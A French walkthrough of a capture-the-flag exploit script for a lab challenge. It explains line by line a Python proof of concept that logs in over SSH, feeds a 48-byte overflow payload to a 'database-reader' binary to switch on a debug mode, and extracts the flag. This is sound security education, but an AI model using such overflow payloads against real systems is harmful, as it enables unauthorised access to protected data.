# Explication détaillée - poc_challenge3.py

## Script 3 : poc_challenge3.py (Buffer Overflow sur database-reader)

### Ligne par ligne

**Ligne 1** : `#!/usr/bin/env python3` - Shebang indiquant l'interpréteur Python 3

**Ligne 2** : `# POC - ECORP Challenge Ov3rwr1t3 (database-reader)` - Commentaire décrivant le POC

**Ligne 4** : `import paramiko` - Importe le module paramiko pour la connexion SSH

**Ligne 5** : `import getpass` - Importe le module pour la saisie sécurisée de mots de passe

**Ligne 6** : `import re` - Importe le module pour les expressions régulières (extraction du flag)

**Ligne 7** : `import sys` - Importe le module pour les fonctions système (exit)

**Ligne 8** : `import time` - Importe le module pour les fonctions de temps (sleep pour l'attente)

**Ligne 10** : `BINARY = "/opt/intern/database-reader"` - Variable contenant le chemin du binaire vulnérable

**Ligne 11** : `PAYLOAD = "A" * 48 + "debug"` - Variable contenant le payload : 48 caractères "A" suivis de "debug" pour écraser une variable et activer le mode debug

**Ligne 13** : `# Connexion SSH` - Commentaire de section

**Ligne 15** : `def connect_ssh():` - Définit la fonction de connexion SSH

**Ligne 16** : `print("\n[*] Connexion SSH...")` - Affiche un message indiquant l'étape

**Ligne 17** : `ssh_host = input("    Host (ex: ecorp.cyber.epitest.eu) : ").strip()` - Demande l'hôte SSH et retire les espaces

**Ligne 18** : `ssh_port = int(input("    Port                             : ").strip())` - Demande le port, convertit en entier et retire les espaces

**Ligne 19** : `ssh_user = input("    Utilisateur                      : ").strip()` - Demande l'utilisateur et retire les espaces

**Ligne 20** : `ssh_pass = getpass.getpass("    Mot de passe                     : ")` - Demande le mot de passe de façon sécurisée

**Ligne 22** : `client = paramiko.SSHClient()` - Crée un client SSH

**Ligne 23** : `client.set_missing_host_key_policy(paramiko.AutoAddPolicy())` - Configure pour accepter automatiquement les clés hôtes inconnues

**Ligne 24** : `try:` - Début du bloc try pour la connexion

**Ligne 25** : `client.connect(ssh_host, port=ssh_port, username=ssh_user, password=ssh_pass)` - Établit la connexion SSH

**Ligne 26** : `print(f"[+] Connecté en SSH sur {ssh_host}:{ssh_port} !")` - Affiche le succès de la connexion

**Ligne 27** : `return client` - Retourne le client connecté

**Ligne 28** : `except Exception as e:` - Capture toute exception

**Ligne 29** : `print(f"[!] Erreur SSH : {e}")` - Affiche l'erreur

**Ligne 30** : `sys.exit(1)` - Quitte avec un code d'erreur

**Ligne 32** : `# Exploitation` - Commentaire de section

**Ligne 34** : `def exploit(client, path):` - Définit la fonction d'exploitation

**Ligne 35** : `print(f"\n[*] Lancement du binaire {path}...")` - Affiche un message

**Ligne 36** : `channel = client.get_transport().open_session()` - Ouvre un canal SSH

**Ligne 37** : `channel.set_combine_stderr(True)` - Combine stderr et stdout

**Ligne 38** : `channel.get_pty()` - Demande un pseudo-terminal pour l'interaction

**Ligne 39** : `channel.exec_command(path)` - Exécute le binaire

**Ligne 41** : `output = ""` - Initialise la sortie vide

**Ligne 42** : `prompt_detected = False` - Initialise le détecteur de prompt

**Ligne 44** : `for _ in range(50):` - Boucle 50 fois pour attendre le prompt

**Ligne 45** : `time.sleep(0.1)` - Attend 0.1 seconde à chaque itération

**Ligne 46** : `if channel.recv_ready():` - Vérifie si des données sont disponibles

**Ligne 47** : `chunk = channel.recv(4096).decode(errors="replace")` - Lit 4096 octets et décode

**Ligne 48** : `output += chunk` - Ajoute à la sortie totale

**Ligne 49** : `print(f"[~] Reçu : {chunk.strip()}")` - Affiche ce qui a été reçu

**Ligne 50** : `if "password" in chunk.lower() or ":" in chunk:` - Vérifie si le prompt contient "password" ou ":"

**Ligne 51** : `prompt_detected = True` - Marque le prompt comme détecté

**Ligne 52** : `break` - Sort de la boucle

**Ligne 53** : `print(f"[+] Prompt détecté, envoi du payload...")` - Affiche le message de succès

**Ligne 54** : `channel.sendall((PAYLOAD + "\n").encode())` - Envoie le payload (48 "A" + "debug") avec saut de ligne, encodé en bytes

**Ligne 56** : `time.sleep(1)` - Attend 1 seconde pour laisser le binaire traiter

**Ligne 57** : `while channel.recv_ready():` - Tant que des données sont disponibles

**Ligne 58** : `chunk = channel.recv(4096).decode(errors="replace")` - Lit les données

**Ligne 59** : `output += chunk` - Ajoute à la sortie totale

**Ligne 60** : `channel.close()` - Ferme le canal

**Ligne 61** : `print(f"\n[+] Output complet :\n{output}")` - Affiche la sortie complète

**Ligne 62** : `return output` - Retourne la sortie

**Ligne 64** : `def extract_flag(output):` - Définit la fonction d'extraction du flag

**Ligne 65** : `match = re.search(r'EPI\{[^}]+\}', output)` - Cherche le pattern EPI{...} avec regex

**Ligne 66** : `if match:` - Si trouvé

**Ligne 67** : `return match.group(0)` - Retourne le flag

**Ligne 68** : `return None` - Sinon retourne None

**Ligne 70** : `def main():` - Définit la fonction principale

**Ligne 71-73** : Affiche le titre du POC

**Ligne 74** : `client = connect_ssh()` - Appelle la fonction de connexion SSH

**Ligne 75** : `binary_path = BINARY` - Utilise le chemin par défaut du binaire

**Ligne 76** : `output = exploit(client, binary_path)` - Appelle la fonction d'exploitation

**Ligne 77** : `flag = extract_flag(output)` - Appelle la fonction d'extraction du flag

**Ligne 78** : `client.close()` - Ferme la connexion SSH

**Ligne 79** : `if flag:` - Si le flag est trouvé

**Ligne 80-82** : Affiche le flag encadré

**Ligne 84** : `else:` - Sinon

**Ligne 84** : `print("[!] Flag non trouvé dans la sortie.")` - Affiche un message d'erreur

**Ligne 85** : `print("[~] Output brut :")` - Affiche un message

**Ligne 86** : `print(repr(output))` - Affiche la représentation brute de la sortie

**Ligne 88** : `if __name__ == "__main__":` - Vérifie si le script est exécuté directement

**Ligne 89** : `main()` - Appelle la fonction principale

---

## Résumé du fonctionnement

Ce script automatise l'exploitation d'une vulnérabilité de buffer overflow sur le binaire database-reader. Il :

1. Se connecte en SSH au serveur distant avec les identifiants fournis
2. Exécute le binaire database-reader via un canal SSH avec PTY
3. Attend l'apparition du prompt du binaire (demande de password)
4. Envoie un payload de 48 caractères "A" suivis de "debug"
5. Le buffer overflow écrase précisément une variable dans la mémoire du programme
6. La chaîne "debug" écrase une variable de configuration, activant un mode debug
7. Le mode debug révèle des informations sensibles incluant le flag
8. Extrait et affiche le flag EPI{...}

**Différence clé avec le script 2** : Ici le payload est ciblé (48 caractères précis) pour écraser une variable spécifique et activer une fonctionnalité (mode debug), alors que le script 2 utilisait un payload massif (600 caractères) pour provoquer une fuite de mémoire brute.
